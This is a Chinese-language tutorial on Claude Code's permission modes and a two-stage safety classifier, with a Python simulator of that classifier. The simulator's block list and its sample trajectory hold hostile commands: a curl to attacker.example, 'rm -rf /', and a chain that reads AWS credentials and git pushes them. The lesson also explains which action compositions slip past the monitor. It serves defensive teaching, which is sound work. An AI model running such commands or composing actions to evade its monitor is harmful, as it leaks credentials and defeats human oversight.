# Claude Code 作为自主智能体：权限模式和自动模式

> Claude Code 暴露七种权限模式。"plan" 在每个动作前询问，"default" 只对风险动作询问，"acceptEdits" 自动批准文件写入但仍确认 shell 执行，"bypassPermissions" 批准一切。自动模式（2026 年 3 月 24 日）将逐动作审批替换为两阶段并行的安全分类器：单词元快速检查运行在每个动作上；被标记的动作启动思维链深度审查。动作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。自动模式作为研究预览发布——Anthropic 已明确声明分类器本身不足够。

**类型：** 概念课
**语言：** Python（标准库，两阶段分类器模拟器）
**前置知识：** 阶段 15 · 01（长期智能体）、阶段 15 · 09（编码智能体全景）
**预计时间：** ~45 分钟
**所处阶段：** Tier 3

---

## 🎯 学习目标

完成本课后，你能够：

- [ ] 命名 Claude Code 的七种权限模式及其适用场景
- [ ] 解释自动模式的两阶段分类器架构——阶段 1 单词元检查，阶段 2 深度审查
- [ ] 理解分类器能捕获什么和可能漏过什么——尤其是语义级误行为和组合性数据泄露
- [ ] 为给定任务匹配合适的权限模式、预算上限所需的隔离级别

---

## 1. 问题

你机器上的自主编码智能体是一个独特的安全类别。攻击面是智能体能触及的一切——文件系统、网络、凭证、剪贴板、任何浏览器标签页、任何打开的终端。计算机使用智能体不是聊天机器人的"功能更新"，它们是一种具有新型风险画像的新型工具。

Claude Code 的权限系统是 Anthropic 的回应。不是单一的"自主/非自主"开关，有七种模式跨越一个能力阶梯。自动模式（2026 年 3 月）添加了一个两阶段分类器，将对分类器判断为安全的动作的审批移出用户的批判路径，同时保留对被标记动作的审查层。

---

## 2. 概念

### 2.1 七种权限模式

| 模式 | 行为 | 何时使用 |
|------|------|---------|
| `plan` | 智能体提议计划；用户批准整个计划；每个动作执行前审查 | 不熟悉的任务；临近生产代码；首次在仓库上使用智能体 |
| `default` | 智能体运行动作；对"风险"动作提示用户 | 大部分交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 和网络调用仍提示 | 跨许多文件的重构 |
| `acceptExec` | Shell 命令在白名单内自动批准；写入自动批准 | 紧内循环，每个 shell 命令都是 `npm test` |
| `autoMode` | 两阶段安全分类器；被标记的动作升级到审查 | 在约束工作空间中的长期无人值守运行 |
| `yolo` | 跳过大多数提示；仍运行工具白名单/黑名单 | 临时沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | 批准一切 | 仅在你愿意丢弃的临时容器内 |

### 2.2 自动模式一页总结

自动模式是第一个将逐动作审批委托给模型的权限模式。

1. **阶段 1——单词元分类器。** 在每个提议的动作上运行。廉价。返回"安全"或"标记"。设计为与主智能体循环并行运行，使已批准的动作不排队等待。
2. **阶段 2——策略/安全审查。** 仅在被标记的动作上运行。对动作、会话当前状态和声明的任务进行集中的策略和安全评估。置信度低时升级到用户 HITL。

预算控制与分类器一起工作：
- `max_turns`——会话中的总迭代次数
- `max_budget_usd`——中止会话的美元上限
- 每个工具的动作计数限制

### 2.3 系统能捕获什么

- 直接的提示注入到工具输入，其中注入指令映射到已知风险动作形状
- 重复性工具循环——分类器可以看到动作 N+1 与动作 N 几乎相同，连续五次
- 在文件编辑会话中明显超出范围的 shell 命令

### 2.4 系统可能漏过什么

| 漏过类型 | 说明 |
|---------|------|
| 微妙提示注入 | 不产生单一被标记动作的提示注入——非完全可修补 |
| 语义级误行为 | 每个动作看起来安全，组合轨迹有害——分类器评判动作，不重新推导用户意图 |
| 通过合法渠道泄露 | 写到你拥有的文件，然后 `git push` 到公开仓库——一系列允许动作的组合 |

### 2.5 模式选择指南

- 不熟悉任务：从 `plan` 开始——读计划比回滚坏运行便宜
- 已知重构：`acceptEdits` 节省大量确认点击
- 无人值守后台：仅在已测量爆炸半径的工作空间内用 `autoMode`
- 临时容器：仅当容器和凭证是可丢弃时才用 `bypassPermissions`

---

## 3. 从零实现

### 第 1 步：定义动作和分类器

```python
from dataclasses import dataclass
from enum import Enum

class Verdict(Enum):
    APPROVE = "approve"
    BLOCK = "block"
    HITL = "hitl"

@dataclass
class Action:
    tool: str
    payload: str
```

### 第 2 步：实现阶段 1——单词元匹配

```python
STAGE1_FLAG_KEYWORDS = (
    "rm -rf /", "curl ", "sudo ", "chmod 777",
    "drop table", "exec('", "base64 -d",
)

def stage1(a: Action, history: list[Action]) -> bool:
    """返回 True 如果阶段 1 标记该动作。"""
    hay = f"{a.tool} {a.payload}".lower()
    if any(k.lower() in hay for k in STAGE1_FLAG_KEYWORDS):
        return True
    # 重复检测
    if len(history) >= 4:
        tail = history[-4:]
        if all(t.tool == a.tool and t.payload == a.payload for t in tail):
            return True
    return False
```

### 第 3 步：实现阶段 2——深度审查

```python
STAGE2_ALLOWED_CURL_HOSTS = ("registry.npmjs.org", "pypi.org", "github.com")

def stage2(a: Action, history) -> tuple[Verdict, str]:
    payload = a.payload.lower()
    # curl 到白名单主机——阶段 1 误报
    if "curl " in payload and any(h in payload for h in STAGE2_ALLOWED_CURL_HOSTS):
        return Verdict.APPROVE, "curl to allowlisted host"
    # 泄露形状 URL
    if "curl " in payload and ("attacker" in payload or "paste" in payload):
        return Verdict.BLOCK, "exfiltration-shaped URL"
    # 破坏性文件系统操作
    if "rm -rf" in payload and ("/" in payload or "$home" in payload):
        return Verdict.BLOCK, "destructive filesystem op at root"
    # 默认：不自信 -> 升级到 HITL
    return Verdict.HITL, "low-confidence -> HITL"
```

### 第 4 步：运行演示

```python
def main():
    traj = [
        Action("read", "pyproject.toml"),
        Action("edit", "src/app.py: fix off-by-one"),
        Action("run", "pytest -q"),
        Action("shell", "curl https://pypi.org/simple/requests/"),  # S1 flag, S2 clears
        Action("shell", "curl http://attacker.example/exfil"),  # 注入
        Action("shell", "rm -rf /"),  # 破坏性操作
        Action("shell", "sudo apt install neofetch"),  # 提权
        Action("read", "logs/app.log"),  # 重复 4 次…
        Action("read", "logs/app.log"),
        Action("read", "logs/app.log"),
        Action("read", "logs/app.log"),
        Action("read", "logs/app.log"),  # 重复循环
        # 组合：每步安全，一起泄露
        Action("read", "~/.aws/credentials"),
        Action("write", "/tmp/secrets.txt with credential blob"),
        Action("shell", "git add /tmp/secrets.txt && git push"),
    ]
    classify(traj)
```

完整代码见 `code/main.py`。

---

## 4. 工业工具

### 4.1 Claude Code 权限模型

| 控制 | 用途 |
|------|------|
| 权限模式 | 从 plan 到 bypassPermissions 的阶梯 |
| 工具白名单 | 什么工具可用 |
| 动作预算 | max_turns、max_budget_usd |
| 两阶段分类器 | 阶段 1 快速 + 阶段 2 深度 |

### 4.2 部署策略

```
plan → default → acceptEdits → autoMode（逐步提升权限，逐步验证）
```

从不以 bypassPermissions 开始。从 plan 开始，在理解风险后逐步提升。

---

## 5. 工程最佳实践

### 5.1 权限模式选择原则

| 原则 | 说明 |
|------|------|
| 从不从 bypassPermissions 开始 | 从 plan 开始，逐步提升 |
| 分类器是层，不是解决方案 | 阶段 1+2 漏过组合攻击 |
| 预算与分类器配对 | max_turns + max_budget_usd 配合使用 |
| 选择模式匹配任务 | 不熟悉任务 = plan，重构 = acceptEdits |

---

## 6. 常见错误

### 错误 1：在无人值守运行中用 bypassPermissions

**现象：** 智能体在 CI 中 24 小时运行。一个提示注入导致它运行了意外命令。

**原因：** bypassPermissions 批准一切。

**修复：** 无人值守运行用 autoMode + 预算。临时容器用 bypassPermissions。

### 错误 2：信任分类器捕获组合攻击

**现象：** 分类器在每个动作上都说安全。但三个动作的组合泄露了凭证。

**原因：** 阶段 1 和阶段 2 都评判单个动作，不评判轨迹。

**修复：** 分类器是层，不是解决方案。需要轨迹审计。

### 错误 3：不设预算上限

**现象：** 智能体进入无限循环，烧掉$500。

**原因：** 没有 max_turns 或 max_budget_usd。

**修复：** 总是设置 max_turns 和 max_budget_usd。

---

## 7. 面试考点

### Q1：Claude Code 的七种权限模式是什么？（难度：⭐）

**参考答案：**
plan（动作前都问）→ default（只问风险）→ acceptEdits（文件自动）→ acceptExec（shell 白名单）→ autoMode（两阶段分类器）→ yolo（跳过大多数）→ bypassPermissions（批准一切）。

选择取决于任务风险和频率。

### Q2：自动模式的两阶段分类器如何工作？（难度：⭐⭐）

**参考答案：**
阶段 1——单词元快速检查，在所有动作上并行运行。返回"安全"或"标记"。廉价。

阶段 2——仅在被标记的动作上运行。思维链推理，对动作+上下文+任务进行评估。不自信时升级到 HITL。

预算控制（max_turns、max_budget_usd）与分类器配合。Anthropic 作为研究预览发布。

### Q3：分类器漏过什么？为什么不是完整的解决方案？（难度：⭐⭐）

**参考答案：**
三类漏过：微妙提示注入（不产生单一被标记动作）、语义级误行为（每个动作安全但组合轨迹有害）、通过合法渠道泄露（一系列允许动作的组合）。

原因：分类器评判单个动作，不重新推导用户意图。泄漏是最难的类别——每个动作允许，组合是问题。

### Q4：如何为无人值守长期运行配置权限？（难度：⭐⭐⭐）

**参考答案：**
（1）用 autoMode 而非 bypassPermissions。
（2）设置 max_turns 和 max_budget_usd。
（3）在已测量爆炸半径的工作空间内运行——无凭证、无挂载、无未选择退出的出站。
（4）设置每工具动作计数限制。
（5）轨迹审计 + 终止开关（第 14 课）。

---

## 🔑 关键术语

| 术语 | 人们怎么说 | 实际含义 |
|------|-----------|---------|
| 权限模式 | "智能体能做多少" | 控制逐动作审批的七种命名策略之一 |
| plan 模式 | "做任何事前问" | 智能体写计划；用户批准后执行 |
| autoMode | "自动审批" | 两阶段安全分类器；被标记动作升级 |
| bypassPermissions | "全 YOLO" | 批准一切；用于临时容器 |
| 阶段 1 分类器 | "快速单词元检查" | 提议动作上的单词元规则；并行运行 |
| 阶段 2 分类器 | "深度审查" | 被标记动作上的思维链推理 |

---

## 📚 小结

Claude Code 的七种权限模式提供了从 plan 到 bypassPermissions 的自主性阶梯。自动模式的两阶段分类器（单词元快速 → 深度审查）在用户的批判路径之外处理安全动作，但不能捕获语义级误行为或组合泄露。分类器是层，不是解决方案——需要与预算、白名单、轨迹审计配对。

下一课：浏览器智能体——阅读不受信任内容并采取后果行动，攻击面完全不同。

---

## ✏️ 练习

1. **【实验】** 运行 `code/main.py`。哪个动作被阶段 1 捕获但被阶段 2 放行？哪个两者都捕获不到？

2. **【实现】** 扩展阶段 1 规则集以捕获 `curl $ATTACKER/exfil`。测量良性动作样本上的误报率。

3. **【思考】** 设计 24 小时无人值守运行预算：max_turns、max_budget_usd、每工具上限、白名单。论证每个数字。

4. **【设计】** 描述一个轨迹，其中每个动作都被阶段 1 和 2 批准，但组合行为是错位的。

---

## 🚀 产出

| 产出 | 文件 | 说明 |
|------|------|------|
| 两阶段分类器 | `code/main.py` | 自动模式分类器模拟器 + 组合泄露演示 |
| 技能提示词 | `outputs/skill-permission-mode-picker.md` | 任务→权限模式匹配器 |

---

> 本课程参考了 AI Engineering From Scratch（MIT License）的课程体系，在此基础上进行了重构和原创内容的扩充。
